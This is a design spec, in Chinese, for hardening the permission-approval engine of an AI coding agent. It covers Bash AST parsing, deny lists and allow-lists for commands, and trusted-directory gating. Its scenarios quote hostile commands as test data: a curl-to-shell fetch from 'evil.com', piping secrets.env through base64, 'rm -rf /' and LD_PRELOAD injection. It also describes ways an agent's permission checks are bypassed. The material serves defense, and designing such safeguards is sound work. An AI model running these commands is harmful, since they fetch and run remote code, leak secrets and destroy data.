# [权限审批引擎重构] Spec

## Why

当前 Harness Code 的权限审批在三个关键领域落后于 Claude Code、Grok Build、Qwen Code，存在严重安全漏洞：

1. **规则格式为 JSON 结构体**（`{tool, resource, effect, scope}`），用户无法手写，也无法与竞品的 `ToolName(RuleContent)` DSL 生态互通。
2. **Shell/Bash 处理极度简陋**：无 AST 解析，链式命令 `git add . && rm -rf /` 只提取首词 `git`，导致 `Always Allow` 后过度授权；无词边界检查，`git` 会匹配 `gitleaks`；无 CWE-178 前导空白绕过防护。
3. **多工具并行审批合并为一次**：用户无法对并行 tool call 中的个别工具单独拒绝，且合并决策广播后很容易产生意想不到的安全后果。
4. **拒绝行为不符合行业惯例**：当前拒绝后继续执行其他并行工具，而非终止同批。

## What Changes

- **规则格式 DSL 化**：JSON 结构体 → `ToolName(RuleContent)` 字符串，支持 `Bash(git clone *)`、`Read(./src/**)`、`WebFetch(domain:github.com)` 等写法，与 Claude Code/Grok 生态兼容
- **Bash AST 安全解析**：引入 tree-sitter 拆分链式命令，逐 segment 评估权限；增加词边界检查、前导空白防绕过、危险命令检测、安全命令白名单
- **多工具审批改为逐个串行**：仅对非并发安全工具（写/执行/删除/Agent）逐个弹窗审批，一个时刻只有一个权限提示；并发安全工具（读/grep/glob 等）可并行执行无需审批
- **拒绝行为对齐竞品**：PolicyDeny → Continue（返回错误给模型调整）；UserReject → PermissionReject（终止同批）
- **受信目录门**：未受信项目目录强制 `default` 模式，隐藏 Always-allow 选项
- **AUTO 模式危险规则剥离**：进入 AUTO 时临时剥离 `Bash(*)` 等宽泛 allow 规则，退出恢复
- **AUTO 模式编辑快速放行**：auto 模式下所有 Edit 类工具（write_file/edit_file/apply_patch）不经分类器直接放行，但受保护路径除外
- **Shell 安全底线强制询问**：即使白名单命中，在写文件/env 注入/opaque shell/exec 风险四种底线下仍强制确认

## Impact

- Affected specs: 无（首次规格）
- Affected code:
  - `packages/agent/harness_agent/policy/` — 规则引擎、审批管线、AUTO 过滤器
  - `packages/agent/harness_agent/host/run_coordinator.py` — 多工具审批交互
  - `packages/agent/harness_agent/runtime/agent.py` — 审批预检
  - `packages/cli/src/tui/presentation/timeline.tsx` — 审批卡片逐步展示
  - `packages/cli/src/tui/application/controller.ts` — 审批回传
  - `packages/protocol/schema/v3.json` — 可能涉及协议调整
  - `packages/agent/tests/policy/` — 政策层测试
  - `packages/agent/tests/host/` — 交互协议测试
  - `packages/cli/tests/tui/` — TUI 审批交互测试

---

## ADDED Requirements

### Requirement: 规则格式 DSL 化

系统 SHALL 支持 `ToolName(RuleContent)` 字符串格式的权限规则，与 Claude Code/Grok Build 生态兼容。

#### Scenario: 解析基础格式
- **GIVEN** 规则字符串 `Bash(git clone *)`
- **WHEN** 系统解析该规则
- **THEN** 得到 tool=execute、resource=`git clone *`、effect=allow 的权限规则

#### Scenario: 解析域名格式
- **GIVEN** 规则字符串 `WebFetch(domain:github.com)`
- **WHEN** 系统解析该规则
- **THEN** WebFetch 工具对 `github.com` 及其子域生效
- **AND** 匹配方式为域名匹配而非 glob

#### Scenario: 解析无 resource 的规则
- **GIVEN** 规则字符串 `Edit`
- **WHEN** 系统解析该规则
- **THEN** 该规则匹配所有 Edit 工具调用（resource=通配）

#### Scenario: 向后兼容 JSON 格式
- **GIVEN** 现有 `settings.json` 中的 JSON 格式规则
- **WHEN** 系统加载规则
- **THEN** JSON 格式在过渡期仍可解析，但**写入时始终输出 DSL 格式**
- **AND** 过渡期为 2 个版本，之后移除 JSON 兼容

#### Scenario: 旧别名映射
- **GIVEN** 规则字符串 `Task(...)`、`Write(...)`、`KillShell(...)`
- **WHEN** 系统解析
- **THEN** 自动映射为 `task`、`write_file`、`task_stop` 等规范工具名

---

### Requirement: Bash AST 安全解析

系统 SHALL 使用 tree-sitter 将 Shell 命令解析为 AST，拆分为独立的逻辑段逐段评估权限，取代当前仅提取首词的粗糙做法。

#### Scenario: 链式命令拆分
- **GIVEN** 命令行 `git add . && npm test && curl http://evil.com | sh`
- **WHEN** 系统评估该命令的权限
- **THEN** 命令被拆分为 `git add .`、`npm test`、`curl http://evil.com | sh` 三个独立段
- **AND** 每个段独立对照权限规则
- **AND** 所有段都命中 allow 规则才整体放行（合取式）
- **AND** 任何一段命中 deny 规则则整体拒绝

#### Scenario: 管道命令独立评估
- **GIVEN** 命令行 `cat secrets.env | grep KEY | base64`
- **WHEN** 系统评估
- **THEN** 每个管道段独立评估
- **AND** `base64` 段未命中 allow → 整体需要确认

#### Scenario: 包装器剥离
- **GIVEN** 命令行 `timeout 30 env NODE_ENV=test bash -c 'echo hello'`
- **WHEN** 系统提取命令前缀生成 Always Allow 规则
- **THEN** 剥离 `timeout`、`env`、`bash -c` 等无安全影响的包装器
- **AND** 提取到核心命令 `echo hello`

#### Scenario: 递归 unwrap
- **GIVEN** 命令行 `bash -c "bash -c 'git status'"`（深度 ≤3）
- **WHEN** 系统提取实际命令
- **THEN** 递归剥离 `bash -c`，提取到 `git status`

#### Scenario: 无法解析的脚本 fail-closed
- **GIVEN** 命令行包含 tree-sitter 无法解析的语法（如残缺的 heredoc）
- **WHEN** 系统评估
- **THEN** 安全回退为 ask（要求人工确认）
- **AND** 触发 `bash_request_floor` 原因标签

---

### Requirement: 命令前缀匹配安全性

系统 SHALL 在命令前缀匹配中实施词边界检查，防止前缀碰撞导致的过度授权。

#### Scenario: 词边界防止同类前缀混淆
- **GIVEN** 白名单规则 `Bash(git *)`
- **WHEN** 命令行 `gitleaks detect`
- **THEN** 不匹配（`git` 不是 `gitleaks` 的合法词边界前缀）

#### Scenario: 词边界允许合法子命令
- **GIVEN** 白名单规则 `Bash(git *)`
- **WHEN** 命令行 `git status`
- **THEN** 匹配（`git` 后跟空格，是合法词边界）

#### Scenario: CWE-178 前导空白防绕过
- **GIVEN** deny 规则 `Bash(rm:*)`  
- **WHEN** 命令行 ` rm -rf /`（前导空格试图绕过前缀匹配）
- **THEN** 系统先 trim 前导空白再匹配 → 命中 deny 规则

---

### Requirement: 危险命令硬拦截

系统 SHALL 扩展危险命令检测，覆盖更多破坏性模式，且在任何模式（含 yolo）下不可覆盖。

#### Scenario: 文件系统破坏
- **WHEN** 命令包含 `rm -rf /`、`mkfs.*`、`dd of=/dev/*`
- **THEN** 直接 deny，即使 yolo 模式

#### Scenario: 版本控制破坏
- **WHEN** 命令包含 `git reset --hard`、`git clean -f*`、`git push --force`
- **THEN** 直接 deny

#### Scenario: 基础设施破坏
- **WHEN** 命令包含 `terraform destroy`、`pulumi destroy`、`cdk destroy`
- **THEN** 直接 deny

#### Scenario: 用户意图豁免（Qwen 风格）
- **GIVEN** 用户最近消息包含"丢弃"、"清除"、"重置"、"意丢弃所有改动"
- **WHEN** 命令为 `git reset --hard HEAD`
- **THEN** 降级为 ask（而非 deny），让用户确认

---

### Requirement: 安全命令白名单自动放行

系统 SHALL 内置只读安全命令白名单，在 default 模式下自动放行无需弹窗。

#### Scenario: 文件查看命令
- **WHEN** 命令为 `ls`、`cat`、`head`、`tail`、`wc`、`sort`、`uniq`、`tr`、`cut`（无重定向）
- **THEN** 自动 allow

#### Scenario: 版本控制只读命令
- **WHEN** 命令为 `git status`、`git log`、`git diff`、`git show`（无 force/push 等写子命令）
- **THEN** 自动 allow

#### Scenario: 搜索命令
- **WHEN** 命令为 `grep`、`rg`、`find .`（无 `-exec`）
- **THEN** 自动 allow

#### Scenario: 内置安全命令包含潜在危险参数时
- **WHEN** `rg --pre 'echo malicious'` 命中白名单 `rg`
- **THEN** 白名单不生效（检测到危险参数 `--pre`），回退 ask

---

### Requirement: Shell 安全底线强制询问

系统 SHALL 实现四条安全底线：即使白名单命中，出现以下情况时仍强制询问。

#### Scenario: 命令写入真实文件
- **WHEN** 命令包含输出重定向（`>`、`>>`）或写命令（`tee`、`dd of=...`）
- **THEN** 白名单仅覆盖命令本身，重定向/写操作额外触发 ask

#### Scenario: 不安全环境变量
- **WHEN** 命令通过 `VAR=value cmd` 或 `env VAR=value cmd` 注入危险环境变量（LD_PRELOAD 等）
- **THEN** 底线触发，强制询问

#### Scenario: Opaque shell
- **WHEN** 命令包含 `bash -c "$VAR"`、`eval "$X"` 等无法静态分析的动态执行
- **THEN** 底线触发，强制询问

#### Scenario: Exec 风险
- **WHEN** 命令可能触发 git hooks 等外部可执行文件（通过 `git commit`、`git rebase` 等隐含 exec）
- **THEN** 底线触发，强制询问

---

### Requirement: 路径安全检查

系统 SHALL 对文件操作工具实施路径级安全检查，与竞品对齐。

#### Scenario: 工作区外的写入
- **WHEN** Edit/Write 目标路径不在工作区内（经 realpath 解析符号链接后判断）
- **THEN** 即使命中 allow 规则也强制 ask
- **AND** 敏感符号链接指向工作区外 → 视为工作区外

#### Scenario: 绝对路径深度保护
- **WHEN** Delete 目标为 `/`、`/home`、`C:\`、`C:\Users` 等层级过浅的绝对路径
- **THEN** 直接 deny

#### Scenario: 受保护路径编辑
- **WHEN** Edit/Write 目标为 `.git/config`、`.github/workflows/*.yml`、`.husky/*`、`Makefile`
- **THEN** 即使命中 allow 规则也强制 ask（工作区安全底线）

---

### Requirement: 多工具审批逐个串行化

系统 SHALL 对非并发安全工具逐个串行审批，一个时刻仅显示一个权限提示窗口。并发安全工具（READ/INTERACT 类别）无需审批可直接并行执行。

非并发安全工具包括：`execute`、`write_file`、`edit_file`、`delete_file`、`apply_patch`、`task`（子 Agent）、`web_fetch`、`monitor`、`task_stop`。
并发安全工具包括：`ls`、`read_file`、`glob`、`grep`、`web_search`、`lsp`、`tool_search`、`memory_search`、`task_output`、`ask_user`、`write_todos` 等。

#### Scenario: 并发安全工具直接并行执行
- **GIVEN** 模型一次返回 3 个工具调用：`read_file a.py`、`grep "foo"`、`write_file b.py`
- **WHEN** 系统开始执行
- **THEN** `read_file a.py` 和 `grep "foo"` 无需审批，直接并行执行
- **AND** `write_file b.py` 进入审批队列，等待用户确认

#### Scenario: 非并发安全工具逐个弹窗
- **GIVEN** 模型一次返回 3 个需要确认的工具调用：`write_file a.py`、`execute "npm test"`、`write_file b.py`
- **WHEN** 系统开始审批流程
- **THEN** 首先弹出 `write_file a.py` 的权限确认窗口
- **AND** `execute "npm test"` 的窗口直到第一个被处理后才显示
- **AND** 三个窗口按序出现

#### Scenario: PolicyDeny 后继续执行
- **GIVEN** 3 个 tool call 串行审批中，第二个命中 deny 规则
- **WHEN** 第二个被 PolicyDeny 拒绝
- **THEN** 返回 ToolMessage(error) 给模型
- **AND** 第三个 tool call 继续执行（不受影响）

#### Scenario: UserReject 后终止同批
- **GIVEN** 3 个 tool call 串行审批中，第二个弹出权限窗口
- **WHEN** 用户点击 Reject
- **THEN** 第二个被拒绝
- **AND** 第三个 tool call 跳过，直接返回 "cancelled due to earlier permission rejection"

#### Scenario: 已完成的不回滚
- **GIVEN** 3 个 tool call 串行审批，第一个已 Allow 执行完成，第二个被 UserReject
- **THEN** 第一个执行结果保留（不回滚）
- **AND** 第三个跳过

---

### Requirement: 受信目录门

系统 SHALL 在未受信项目目录中强制保守的权限策略，防止恶意仓库提权。

#### Scenario: 未受信目录强制 default 模式
- **GIVEN** 用户 `cd` 到一个未受信的项目目录
- **WHEN** 用户尝试切换到 auto/yolo 模式
- **THEN** 拒绝切换，保持在 default 模式
- **AND** 提示"未受信目录，权限模式锁定为 default"

#### Scenario: 未受信目录隐藏 Always-allow
- **GIVEN** 当前项目目录不受信
- **WHEN** 出现权限确认窗口
- **THEN** 不显示"Always Allow This Session"和"Always Allow Permanently"选项
- **AND** 仅显示"Allow Once"和"Reject"

#### Scenario: 受信目录正常使用
- **GIVEN** 用户已将项目目录标记为受信
- **WHEN** 使用审批功能
- **THEN** 所有模式和选项正常显示

#### Scenario: 自动信任判定
- **GIVEN** 项目目录是 git 仓库且用户已在该目录执行过任务
- **WHEN** 用户首次进入该目录
- **THEN** 可自动标记为受信（或弹一次确认"是否信任此目录？"）

---

### Requirement: AUTO 模式危险规则剥离

系统 SHALL 在进入 AUTO 模式时临时剥离过于宽泛的 allow 规则，防止分类器被绕过。

#### Scenario: 剥离全通配 Bash 规则
- **GIVEN** settings.json 中有 `Bash(*)` 或 `Bash` allow 规则
- **WHEN** 进入 AUTO 模式
- **THEN** 运行时暂时忽略该规则（不写回磁盘）
- **AND** shell 调用将经过 AUTO 分类器正常审查

#### Scenario: 剥离裸解释器规则
- **GIVEN** allow 规则 `Bash(python *)`、`Bash(node *)`、`Bash(bash *)`、`Bash(sh *)`
- **WHEN** 进入 AUTO 模式
- **THEN** 运行时暂时忽略这些规则

#### Scenario: 退出 AUTO 后恢复
- **GIVEN** 用户从 AUTO 切换到 default 或其他模式
- **WHEN** 恢复权限评估
- **THEN** 之前剥离的规则重新生效

#### Scenario: 影响范围限定
- **GIVEN** AUTO 模式规则剥离
- **WHEN** 检查规则是否被剥离
- **THEN** 仅影响 allow 行为，deny/ask 规则不受影响
- **AND** 仅在 AUTO 模式下生效，不影响 default/auto-edit/yolo 模式

---

### Requirement: AUTO 模式编辑快速放行

系统 SHALL 在 AUTO 模式下对所有 Edit 类工具（`write_file`、`edit_file`、`apply_patch`）不经分类器直接放行，仅受保护路径例外。

#### Scenario: 工作区内非保护路径直接放行
- **GIVEN** AUTO 模式
- **WHEN** 模型调用 `write_file src/utils/helper.py`
- **AND** 目标路径不在受保护路径列表中
- **AND** 目标路径在工作区范围内
- **THEN** 不进入 F4 LLM 分类器，直接 allow
- **AND** 触发原因标记为 `auto_fast_path`

#### Scenario: 受保护路径不快速放行
- **GIVEN** AUTO 模式
- **WHEN** 模型调用 `edit_file .git/config`
- **AND** 目标路径命中受保护路径列表
- **THEN** 不适用快速放行，继续进入正常审批管线（经过 F4 分类器或回退人工确认）

#### Scenario: 工作区外编辑不快速放行
- **GIVEN** AUTO 模式
- **WHEN** 模型调用 `write_file /etc/hosts`
- **AND** 目标路径不在工作区范围内
- **THEN** 不适用快速放行，继续进入正常审批管线

#### Scenario: Delete 不走快速放行
- **GIVEN** AUTO 模式
- **WHEN** 模型调用 `delete_file src/temp.txt`
- **THEN** 删除操作不适用编辑快速放行，正常经过 AUTO 分类器

#### Scenario: 非 AUTO 模式不适用
- **GIVEN** default 或 auto-edit 或 yolo 模式
- **WHEN** 模型调用 `write_file src/helper.py`
- **THEN** 按各自模式的现有规则处理，不适用 auto 编辑快速放行
- **AND** auto-edit 模式保持其原有"工作区内编辑自动执行"的行为独立运作

---

## MODIFIED Requirements

### Requirement: Always Allow 规则生成粒度精细化

原系统批准 `git status` 生成 `execute: "git *"` 规则（全通配 git 子命令），改为 AST 提取最小范围规则。

#### Scenario: 子命令精确提取
- **GIVEN** 用户对 `git clone https://github.com/user/repo.git` 选择 Always Allow
- **WHEN** 系统生成持久化规则
- **THEN** 生成 `Bash(git clone *)` 而非 `Bash(git *)`
- **AND** 该规则仅匹配 `git clone <any-url>`，不匹配 `git push --force`

#### Scenario: 无参数命令保持原样
- **GIVEN** 用户对 `whoami` 选择 Always Allow
- **WHEN** 系统生成规则
- **THEN** 生成 `Bash(whoami)`

#### Scenario: 三级命令支持
- **GIVEN** 用户对 `docker compose up -d` 选择 Always Allow
- **WHEN** 系统生成规则
- **THEN** 生成 `Bash(docker compose up *)`

#### Scenario: 文件工具的目录级规则
- **GIVEN** 用户对 `write_file src/utils/helper.py` 选择 Always Allow
- **WHEN** 系统生成规则
- **THEN** 生成 `Edit(src/utils/**)` 目录递归规则

#### Scenario: WebFetch 域名级规则
- **GIVEN** 用户对 `web_fetch https://api.github.com/repos/...` 选择 Always Allow
- **WHEN** 系统生成规则
- **THEN** 生成 `WebFetch(domain:api.github.com)` 域名规则

---

### Requirement: 审批流水线 F3 过滤器扩展

原 `auto_mode.py` 中的 `DESTRUCTIVE_PATTERNS` 正则列表保持不变，在其基础上增加：

1. 危险命令表在 AUTO 过滤器评估前先经过 AST 解析，按 segment 拆分后逐段检测
2. 仅检测段（而非整条命令）决定 deny 还是降级
3. 破坏性命令行检测新增 git checkout -- .、git stash drop、git commit --amend（非本 Agent 提交）、kubectl delete、chmod -R 777、chown -R 等
